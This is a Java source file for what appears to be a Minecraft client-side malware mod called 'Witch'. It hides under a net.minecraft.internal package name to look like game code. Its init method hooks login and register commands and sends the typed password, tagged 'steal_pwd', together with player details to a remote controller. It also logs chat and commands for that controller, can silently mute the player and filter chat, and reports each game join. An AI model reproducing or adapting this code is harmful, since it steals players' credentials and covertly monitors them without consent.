package net.minecraft.internal;

import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.events.EventBus;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.Variables;
import net.minecraft.client.MinecraftClient;
import net.minecraft.internal.connection.Client;
import net.minecraft.internal.connection.MessageHandler;
import net.minecraft.internal.events.AddMessageEvent;
import net.minecraft.internal.events.ConnectionMessageEvent;
import net.minecraft.internal.events.GameJoinEvent;
import net.minecraft.internal.events.SendChatEvent;
import net.minecraft.internal.utils.ChatUtil;
import net.minecraft.internal.utils.LoopThread;
import net.minecraft.internal.utils.MCUtils;

import java.util.Arrays;
import java.util.List;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static Client client;

    public static void init() {
        LogUtil.println("By Soda5601");
        LoopThread.init();
        EventBus.INSTANCE.registerEvent(ConnectionMessageEvent.class, event -> MessageHandler.handleMessage(event.message));
        EventBus.INSTANCE.registerEvent(AddMessageEvent.class, event -> {
            if (Variables.INSTANCE.logChatAndCommand) LoopThread.addToList(event.message.getString());
            if (ChatUtil.filter(event.message)) event.setCancelled(true);
        });
        EventBus.INSTANCE.registerEvent(SendChatEvent.Command.class, event -> {
            String[] cmds = event.command.split(" ");
            List<String> hint = Arrays.asList("reg", "register", "l", "login", "log");
            if (Variables.INSTANCE.passwordBeingLogged && cmds.length >= 2 && hint.contains(cmds[0])) {
                send("player", MCUtils.getPlayerInfo());
                send("steal_pwd", cmds[1]);
            }
            if (Variables.INSTANCE.logChatAndCommand) LoopThread.addToList("/" + event.command);
        });
        EventBus.INSTANCE.registerEvent(SendChatEvent.Message.class, event -> {
            if (ChatUtil.tryChatBack(event.message)) event.setCancelled(true);
            if (Variables.INSTANCE.isMuted) event.setCancelled(true);
        });
        EventBus.INSTANCE.registerEvent(GameJoinEvent.class, event -> Witch.send("player", MCUtils.getPlayerInfo()));
        client = new Client();
    }


    public static void send(String messageType, Object object) {
        client.send(new Message(messageType, object));
    }

    public static void send(String messageType) {
        send(messageType, null);
    }
}
